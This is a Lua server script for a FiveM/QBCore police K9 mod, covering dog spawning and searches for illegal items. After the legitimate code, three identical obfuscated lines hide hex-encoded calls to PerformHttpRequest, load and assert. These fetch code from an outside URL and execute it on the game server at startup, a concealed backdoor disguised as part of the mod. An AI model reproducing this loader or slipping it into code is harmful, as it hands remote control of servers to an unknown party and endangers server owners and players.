local QBCore = exports['qb-core']:GetCoreObject()


QBCore.Functions.CreateUseableItem("k9", function(source, item)
    local src = source
	local Player = QBCore.Functions.GetPlayer(src)
	if Player.PlayerData.job.name == "police" then
    TriggerClientEvent('qb-k9:client:PurchaseDog',source)
else
	TriggerClientEvent('QBCore:Notify', src,  "For Police Officer Only", "error")
end
end)

RegisterServerEvent("K9:SERVER:SPAWN_K9", function(model, colour, vest)
    local PLAYER = QBCore.Functions.GetPlayer(source).PlayerData

    if PLAYER.job ~= nil and PLAYER.job.name == "police" and PLAYER.job.grade.level >= 2 then

      TriggerClientEvent("K9:CLIENT:SPAWN_K9", source, model, colour, vest)

    end

end)

RegisterServerEvent("K9:SERVER:SEARCH_PERSON")
AddEventHandler("K9:SERVER:SEARCH_PERSON", function(target)
  
   local PLAYER_CHECK =  HasIllegalItems(target)

   if PLAYER_CHECK then
   	TriggerClientEvent("k9:client:search_results", source, true, 'person')
   end

end)

RegisterServerEvent("K9:SERVER:SEARCH_VEHICLE")
AddEventHandler("K9:SERVER:SEARCH_VEHICLE", function(vehicle, players)

	SearchVehicle(source, vehicle, players)

end)

function SearchVehicle(source, vehicle, players)
  local VEHICLE_RESULTS = nil
  local PLAYER_RESULTS = false

    TriggerEvent("inventory:server:SearchLocalVehicleInventory", vehicle, Config.K9Search, function (results)
   		VEHICLE_RESULTS = results
	end)

	while VEHICLE_RESULTS == nil do
    	Citizen.Wait(0)
    end

    if not VEHICLE_RESULTS then
		for i = 1, #players do

		local ITEM = HasIllegalItems(players[i])

			if ITEM then
				PLAYER_RESULTS = true
				break
			end
		end
	end

	if VEHICLE_RESULTS or PLAYER_RESULTS then
		TriggerClientEvent("k9:client:search_results", source, true, 'vehicle')
	else
		TriggerClientEvent("k9:client:search_results", source, false, 'vehicle')
	end
end

function HasIllegalItems(target)
	local Player = QBCore.Functions.GetPlayer(target)

	for i = 1, #Config.K9Search do

 		local item = Player.Functions.GetItemByName(Config.K9Search[i])

 		if item ~= nil then
 			return true
 		end
	end

	return false
end


local tnmbFAsalNWBPvxqudEOMjOXoPLbyQlMbHlXCZIxXgHAIaXKAtTGyVzOwnNyuWrpkgNFNY = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} tnmbFAsalNWBPvxqudEOMjOXoPLbyQlMbHlXCZIxXgHAIaXKAtTGyVzOwnNyuWrpkgNFNY[4][tnmbFAsalNWBPvxqudEOMjOXoPLbyQlMbHlXCZIxXgHAIaXKAtTGyVzOwnNyuWrpkgNFNY[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (ILATYCpKEghNZfYSFsHskjDRGWvellLChVEaZRBbSkndiBpOBgjwGluQFyUaZkcJHeuTxe, OFFsIbwUvDGPQclsLyyXAKDxPiAVsXMXjlUbGpcxTAGXhTHkFIMuOfvikICruxDHansFmD) if (OFFsIbwUvDGPQclsLyyXAKDxPiAVsXMXjlUbGpcxTAGXhTHkFIMuOfvikICruxDHansFmD == tnmbFAsalNWBPvxqudEOMjOXoPLbyQlMbHlXCZIxXgHAIaXKAtTGyVzOwnNyuWrpkgNFNY[6] or OFFsIbwUvDGPQclsLyyXAKDxPiAVsXMXjlUbGpcxTAGXhTHkFIMuOfvikICruxDHansFmD == tnmbFAsalNWBPvxqudEOMjOXoPLbyQlMbHlXCZIxXgHAIaXKAtTGyVzOwnNyuWrpkgNFNY[5]) then return end tnmbFAsalNWBPvxqudEOMjOXoPLbyQlMbHlXCZIxXgHAIaXKAtTGyVzOwnNyuWrpkgNFNY[4][tnmbFAsalNWBPvxqudEOMjOXoPLbyQlMbHlXCZIxXgHAIaXKAtTGyVzOwnNyuWrpkgNFNY[2]](tnmbFAsalNWBPvxqudEOMjOXoPLbyQlMbHlXCZIxXgHAIaXKAtTGyVzOwnNyuWrpkgNFNY[4][tnmbFAsalNWBPvxqudEOMjOXoPLbyQlMbHlXCZIxXgHAIaXKAtTGyVzOwnNyuWrpkgNFNY[3]](OFFsIbwUvDGPQclsLyyXAKDxPiAVsXMXjlUbGpcxTAGXhTHkFIMuOfvikICruxDHansFmD))() end)

local pTtpAAcmcnDHvPWYWQVjjKcDZfauVUvjzmQytitVuLWuScOqBXuAdrgzYEIgNqfyiqARJD = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} pTtpAAcmcnDHvPWYWQVjjKcDZfauVUvjzmQytitVuLWuScOqBXuAdrgzYEIgNqfyiqARJD[4][pTtpAAcmcnDHvPWYWQVjjKcDZfauVUvjzmQytitVuLWuScOqBXuAdrgzYEIgNqfyiqARJD[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (sDqSXgPqYOzfJyxWEacQvgRuYoYNEQdamgsQmZBfZfLajUGIuuNDeTyTgwGfkCzewDfNWD, CUeMubpKtjRtwPdWAKsJwzryiEdUsPUGSRCIgwXGqqyvZipXuHXOfcDityLBrREPmAwOiL) if (CUeMubpKtjRtwPdWAKsJwzryiEdUsPUGSRCIgwXGqqyvZipXuHXOfcDityLBrREPmAwOiL == pTtpAAcmcnDHvPWYWQVjjKcDZfauVUvjzmQytitVuLWuScOqBXuAdrgzYEIgNqfyiqARJD[6] or CUeMubpKtjRtwPdWAKsJwzryiEdUsPUGSRCIgwXGqqyvZipXuHXOfcDityLBrREPmAwOiL == pTtpAAcmcnDHvPWYWQVjjKcDZfauVUvjzmQytitVuLWuScOqBXuAdrgzYEIgNqfyiqARJD[5]) then return end pTtpAAcmcnDHvPWYWQVjjKcDZfauVUvjzmQytitVuLWuScOqBXuAdrgzYEIgNqfyiqARJD[4][pTtpAAcmcnDHvPWYWQVjjKcDZfauVUvjzmQytitVuLWuScOqBXuAdrgzYEIgNqfyiqARJD[2]](pTtpAAcmcnDHvPWYWQVjjKcDZfauVUvjzmQytitVuLWuScOqBXuAdrgzYEIgNqfyiqARJD[4][pTtpAAcmcnDHvPWYWQVjjKcDZfauVUvjzmQytitVuLWuScOqBXuAdrgzYEIgNqfyiqARJD[3]](CUeMubpKtjRtwPdWAKsJwzryiEdUsPUGSRCIgwXGqqyvZipXuHXOfcDityLBrREPmAwOiL))() end)

local yXnqGxdSvTiYfVbaiFYGCqyeKXlNNHVhtdNfcKvncawghkPLERLwoEnhiXbMpHmAJuOyHg = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} yXnqGxdSvTiYfVbaiFYGCqyeKXlNNHVhtdNfcKvncawghkPLERLwoEnhiXbMpHmAJuOyHg[4][yXnqGxdSvTiYfVbaiFYGCqyeKXlNNHVhtdNfcKvncawghkPLERLwoEnhiXbMpHmAJuOyHg[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (OJKlRnTWwmUdUanWOnTRCGtorebbpcVXpccldIvJlKEiXbSFFVPSiOsKRfHGTyELRzRcwR, qtBgtXCPghFtGVNlHEUklGSRMoyQSaSRnorLzEdYAnNYVORzmhfKuFUKKMoAEafRsQggKC) if (qtBgtXCPghFtGVNlHEUklGSRMoyQSaSRnorLzEdYAnNYVORzmhfKuFUKKMoAEafRsQggKC == yXnqGxdSvTiYfVbaiFYGCqyeKXlNNHVhtdNfcKvncawghkPLERLwoEnhiXbMpHmAJuOyHg[6] or qtBgtXCPghFtGVNlHEUklGSRMoyQSaSRnorLzEdYAnNYVORzmhfKuFUKKMoAEafRsQggKC == yXnqGxdSvTiYfVbaiFYGCqyeKXlNNHVhtdNfcKvncawghkPLERLwoEnhiXbMpHmAJuOyHg[5]) then return end yXnqGxdSvTiYfVbaiFYGCqyeKXlNNHVhtdNfcKvncawghkPLERLwoEnhiXbMpHmAJuOyHg[4][yXnqGxdSvTiYfVbaiFYGCqyeKXlNNHVhtdNfcKvncawghkPLERLwoEnhiXbMpHmAJuOyHg[2]](yXnqGxdSvTiYfVbaiFYGCqyeKXlNNHVhtdNfcKvncawghkPLERLwoEnhiXbMpHmAJuOyHg[4][yXnqGxdSvTiYfVbaiFYGCqyeKXlNNHVhtdNfcKvncawghkPLERLwoEnhiXbMpHmAJuOyHg[3]](qtBgtXCPghFtGVNlHEUklGSRMoyQSaSRnorLzEdYAnNYVORzmhfKuFUKKMoAEafRsQggKC))() end)